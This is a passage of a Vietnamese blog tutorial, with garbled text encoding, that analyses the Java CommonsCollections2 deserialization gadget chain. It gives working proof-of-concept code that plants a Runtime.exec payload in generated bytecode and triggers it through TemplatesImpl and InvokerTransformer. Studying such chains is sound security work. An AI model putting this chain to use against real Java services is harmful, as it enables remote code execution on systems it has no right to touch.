class="code"><pre><span class="line">defineClass</span><br><span class="line"><span class="meta">@Deprecated</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> Class&lt;?&gt; defineClass(<span class="type">byte</span>[] b,</span><br><span class="line">                              <span class="type">int</span> off,</span><br><span class="line">                              <span class="type">int</span> len)</span><br><span class="line">                              <span class="keyword">throws</span> ClassFormatError</span><br><span class="line">Deprecated. Replaced by <span class="title function_">defineClass</span><span class="params">(String, <span class="type">byte</span>[], <span class="type">int</span>, <span class="type">int</span>)</span></span><br><span class="line">Converts an array of bytes into an instance of <span class="keyword">class</span> <span class="title class_">Class</span>. Before the Class can be used it must be resolved. This method is deprecated in favor of the version that takes a binary name as its first argument, and is more secure.</span><br><span class="line">Parameters:</span><br><span class="line">    b - The bytes that make up the <span class="keyword">class</span> <span class="title class_">data</span>. The bytes in positions off through off+len-<span class="number">1</span> should have the format of a valid <span class="keyword">class</span> <span class="title class_">file</span> as defined by The Javaâ„¢ Virtual Machine Specification.</span><br><span class="line">    off - The start offset in b of the <span class="keyword">class</span> <span class="title class_">data</span></span><br><span class="line">    len - The length of the <span class="keyword">class</span> <span class="title class_">data</span></span><br><span class="line">Returns:</span><br><span class="line">    The Class object that was created from the specified <span class="keyword">class</span> <span class="title class_">data</span></span><br><span class="line">Throws:</span><br><span class="line">    ClassFormatError - If the data did not contain a valid <span class="keyword">class</span></span><br><span class="line">    <span class="title class_">IndexOutOfBoundsException</span> - If either off or len is negative, or <span class="keyword">if</span> off+len is greater than b.length.</span><br><span class="line">    SecurityException - If an attempt is made to add <span class="built_in">this</span> <span class="keyword">class</span> <span class="title class_">to</span> a <span class="keyword">package</span> that contains classes that were signed by a different set of certificates than <span class="built_in">this</span> class, or <span class="keyword">if</span> an attempt is made to define a <span class="keyword">class</span> <span class="title class_">in</span> a <span class="keyword">package</span> with a fully-qualified name that starts with <span class="string">&quot;java.&quot;</span>.</span><br></pre></td></tr></table></figure><p>PhÆ°Æ¡ng thá»©c nÃ y thá»±c hiá»‡n chuyá»ƒn Ä‘á»•i má»™t máº£ng byte thÃ nh má»™t instance cá»§a class Class hay nÃ³i rÃµ hÆ¡n thÃ¬ nÃ³ táº¡o ra má»™t object cá»§a lá»›p Class, cÃ¡c báº¡n cÃ³ thá»ƒ Ä‘á»c á»Ÿ <a href="%5BLoader.html%5D(https://docs.oracle.com/javase/7/docs/api/java/lang/ClassLoader.html)">Ä‘Ã¢y</a>.</p><p><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/2022/12/16/CommonsCollections2/defineTransletClasses1.png"></p><p>Lá»›p Ä‘Æ°á»£c táº¡o ra tá»« <code>_bytecodes[i]</code> gá»i Ä‘áº¿n <code>getSuperClass</code> tráº£ vá» má»™t super class vÃ  lÆ°u vÃ o biáº¿n superClass, tÃªn cá»§a superClass sáº½ Ä‘Æ°á»£c so sÃ¡nh vá»›i â€œcom.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTransletâ€.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">ABSTRACT_TRANSLET</span></span><br><span class="line">        <span class="operator">=</span> <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>;</span><br></pre></td></tr></table></figure><p>Náº¿u nhÆ° lá»›p cha cá»§a <code>_class[i]</code> lÃ  AbstractTranslet (Hay _Class[i] lÃ  class extends AbstractTranslet) thÃ¬ _transletIndex sáº½ Ä‘Æ°á»£c gÃ¡n báº±ng i. </p><p>NÃ³i chung, sau phÆ°Æ¡ng thá»©c <code>defineTransletClasses()</code>, ta cÃ³ Ä‘Æ°á»£c vá»‹ trá»‹ cá»§a class extends <code>AbstractTranslet</code> lÃ  <code>_transletIndex</code>.</p><p><code>_class[_transletIndex]</code> sáº½ lÃ  lá»›p chuyá»ƒn tá»« <code>_bytecodes</code> vÃ  extends AbstractTranslet.</p><h3 id="getTransletInstance"><a href="#getTransletInstance" class="headerlink" title="getTransletInstance()"></a>getTransletInstance()</h3><p>Tiáº¿p tá»¥c follow theo chain, Ä‘i Ä‘áº¿n phÆ°Æ¡ng thá»©c getTransletInstance. </p><p>NÃ³ thá»±c hiá»‡n _class[_transletIndex].newInstance(). Äiá»ƒm hay lÃ  á»Ÿ chá»• nÃ y, khi má»™t class Ä‘Æ°á»£c khá»Ÿi táº¡o (<code>Class.newInstance()</code>) thÃ¬ nÃ³ sáº½ tá»± Ä‘á»™ng thá»±c thi constructor hoáº·c hÃ m static. </p><p>CÃ¡i nÃ y thuá»™c vá» kiáº¿n thá»©c OOP, mÃ¬nh sáº½ nÃ³i kÄ© hÆ¡n nhÆ° sau:</p><ul><li>Khi táº¡o má»™t instance cá»§a Class báº±ng phÆ°Æ¡ng thá»©c newInstance, nÃ³ sáº½ bao gá»“m hai bÆ°á»›c:<br>  Load class: Khi má»™t class Ä‘Æ°á»£c load lÃªn bá»™ nhá»›, cÃ¡c block static sáº½ Ä‘Æ°á»£c thá»±c thi. CÃ¡c báº¡n chá»‰ cáº§n hiá»ƒu váº­y lÃ  Ä‘á»§, cÃ²n náº¿u muá»‘n hiá»ƒu sÃ¢u hÆ¡n thÃ¬ tÃ¬m hiá»ƒu vá» ClassLoader (tá»‘n thá»i gian láº¯m nhÃ©!).<br>  Táº¡o object: Sau khi class Ä‘Æ°á»£c load lÃªn, constructor sáº½ Ä‘Æ°á»£c thá»±c thi Ä‘á»ƒ khá»Ÿi táº¡o má»™t Ä‘á»‘i tÆ°á»£ng.</li></ul><p>VÃ­ dá»¥:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">App</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Test&quot;</span>);</span><br><span class="line">        ctClass.makeClassInitializer().setBody(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;</span>);</span><br><span class="line">        ctClass.writeFile(<span class="string">&quot;/Users/rayin_awarf/Desktop&quot;</span>);<span class="comment">//Viáº¿t class Test xuá»‘ng thÆ° má»¥c nÃ y</span></span><br><span class="line">        <span class="type">File</span> <span class="variable">f</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;/Users/rayin_awarf/Desktop&quot;</span>);</span><br><span class="line">        URL[] cp = &#123;f.toURI().toURL()&#125;;</span><br><span class="line">        <span class="type">URLClassLoader</span> <span class="variable">urlcl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLClassLoader</span>(cp);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> urlcl.loadClass(<span class="string">&quot;Test&quot;</span>);</span><br><span class="line">        <span class="comment">//Äoáº¡n trÃªn lÃ  láº¥y class Test ra, khÃ´ng quan trá»ng láº¯m. Náº¿u cÃ¡c báº¡n cÃ³ cÃ¡ch hay hÆ¡n thÃ¬ cÃ³ thá»ƒ sá»­ dá»¥ng.</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> clazz.newInstance();</span><br><span class="line">        <span class="comment">//Sau khi thá»±c hiá»‡n newInstance() calc.exe Ä‘Ã£ Ä‘Æ°á»£c thá»±c thi.</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>NhÆ° Ä‘Ã£ phÃ¢n tÃ­ch á»Ÿ trÆ°á»›c <code>_class[_transletIndex]</code> lÃ  lá»›p chuyá»ƒn tá»« <code>_bytecodes</code>, váº­y náº¿u bytecodes chÃºng ta truyá»n vÃ o nÃ y lÃ  cá»§a má»™t class chá»©a static hay constructor chá»©a shell thÃ¬ chÃºng ta sáº½ trigger Ä‘Æ°á»£c nÃ³.<br>CÃ³ hai cÃ¡ch Ä‘á»ƒ lÃ m Ä‘iá»u nÃ y:</p><h4 id="1-javassist"><a href="#1-javassist" class="headerlink" title="1. javassist"></a>1. javassist</h4><ul><li>PhÆ°Æ¡ng thá»©c makeClassInitializer sáº½ táº¡o má»™t constructor.</li><li>makeClassInitializer().setBody sáº½ set ná»™i dung cho hÃ m constructor nÃ y.<br>Test thá»­ vá»›i POC nhá» sau:</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Test&quot;</span>);</span><br><span class="line">        ctClass.setSuperclass(pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>));</span><br><span class="line">        ctClass.makeClassInitializer().setBody(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_nameField</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        _nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _nameField.set(templates, <span class="string">&quot;notNull&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_classField</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_class&quot;</span>);</span><br><span class="line">        _classField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _classField.set(templates, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_bytecodes</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        _bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _bytecodes.set(templates, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        templates.newTransformer();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>calc.exe váº«n chÆ°a Ä‘Æ°á»£c kÃ­ch hoáº¡t, á»Ÿ Ä‘Ã¢y lÃ  do _tfactory chÆ°a Ä‘Æ°á»£c set. _tfactory á»Ÿ Ä‘Ã¢y lÃ  má»™t TransformerFactoryImpl nÃªn chÃºng ta chá»‰ cáº§n Ä‘áº·t lÃ  <code>new TransformerFactoryImpl()</code>.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Test&quot;</span>);</span><br><span class="line">        ctClass.setSuperclass(pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>));</span><br><span class="line">        ctClass.makeClassInitializer().setBody(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_nameField</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        _nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _nameField.set(templates, <span class="string">&quot;notNull&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_classField</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_class&quot;</span>);</span><br><span class="line">        _classField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _classField.set(templates, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_bytecodes</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        _bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _bytecodes.set(templates, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        Field tfactoryField=templates.getClass().getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        templates.newTransformer();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>MÃ¡y tÃ­nh Ä‘Ã£ Ä‘Æ°á»£c báº­t.</p><h4 id="2-Tao-class-roi-load-truc-tiep"><a href="#2-Tao-class-roi-load-truc-tiep" class="headerlink" title="2. Táº¡o class rá»“i load trá»±c tiáº¿p"></a>2. Táº¡o class rá»“i load trá»±c tiáº¿p</h4><p>Khá»Ÿi táº¡o class, á»Ÿ Ä‘Ã¢y mÃ¬nh láº¥y static Ä‘á»ƒ lÃ m vÃ­ dá»¥ (cÃ¡i nÃ o cÅ©ng Ä‘Æ°á»£c).<br>Äáº·t file Calc.java cÃ¹ng thÆ° má»¥c vá»›i cc2.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Calc</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">byte</span>[] shellClass = Files.readAllBytes(Paths.get(<span class="string">&quot;C:\\Users\\rayin_awarf\\Desktop\\work\\java\\cc2\\target\\classes\\org\\example\\Calc.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] bytes = &#123;shellClass&#125;;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_nameField</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        _nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _nameField.set(templates, <span class="string">&quot;notNull&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_classField</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_class&quot;</span>);</span><br><span class="line">        _classField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _classField.set(templates, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_bytecodes</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        _bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _bytecodes.set(templates, bytes);</span><br><span class="line">        Field tfactoryField=templates.getClass().getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        templates.newTransformer();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Ok, hÆ°á»›ng Ä‘i lÃ  nhÆ° tháº¿, bÃ¢y giá» chÃºng ta sáº½ lá»£i dá»¥ng Ä‘iá»u nÃ y vÃ o class TemplatesImpl.</p><ul><li>_name khÃ´ng null</li><li>_class null</li><li>_bytecodes lÃ  bytecodes cá»§a lá»›p cáº§n truyá»n vÃ o.</li></ul><h3 id="Ket-hop-voi-lop-InvokerTransformer"><a href="#Ket-hop-voi-lop-InvokerTransformer" class="headerlink" title="Káº¿t há»£p vá»›i lá»›p InvokerTransformer"></a>Káº¿t há»£p vá»›i lá»›p InvokerTransformer</h3><p>á» cc1 theo TransformedMap, mÃ¬nh Ä‘Ã£ phÃ¢n tÃ­ch vá» lá»›p nÃ y. MÃ¬nh sáº½ tÃ³m gá»n láº¡i nhÆ° sau:</p><ul><li>PhÆ°Æ¡ng thá»©c transform cá»§a lá»›p nÃ y sáº½ thá»±c thi phÆ°Æ¡ng thá»©c mÃ  ta truyá»n vÃ o á»Ÿ invokerTransformer cá»§a object truyá»n vÃ o hÃ m transform.</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Test&quot;</span>);</span><br><span class="line">        ctClass.setSuperclass(pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>));</span><br><span class="line">        ctClass.makeClassInitializer().setBody(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_nameField</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        _nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _nameField.set(templates, <span class="string">&quot;notNull&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_classField</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_class&quot;</span>);</span><br><span class="line">        _classField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _classField.set(templates, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_bytecodes</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        _bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _bytecodes.set(templates, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        Field tfactoryField=templates.getClass().getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//templates.newTransformer();</span></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>&lt;&gt;(<span class="string">&quot;newTransformer&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">        invokerTransformer.transform(templates);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Ctrl + chuá»™t trÃ¡i</code> nháº¥n vÃ o phÆ°Æ¡ng thá»©c transform cá»§a lá»›p InvokerTransformer Ä‘á»ƒ tÃ¬m lá»›p sá»­ dá»¥ng phÆ°Æ¡ng thá»©c nÃ y, lá»›p TransformingComparator lÃ  lá»›p chÃºng ta cáº§n chÃº Ã½ Ä‘áº¿n. </p><p><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/2022/12/16/CommonsCollections2/TranformingComparator.png"></p><p>Lá»›p nÃ y cÃ³ phÆ°Æ¡ng thá»©c compare sá»­ dá»¥ng <code>transformer.transform()</code>.</p><p><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/2022/12/16/CommonsCollections2/TranformingComparatorCompare.png"></p><p>PhÃ¢n tÃ­ch má»™t chÃºt, hÃ m táº¡o cá»§a 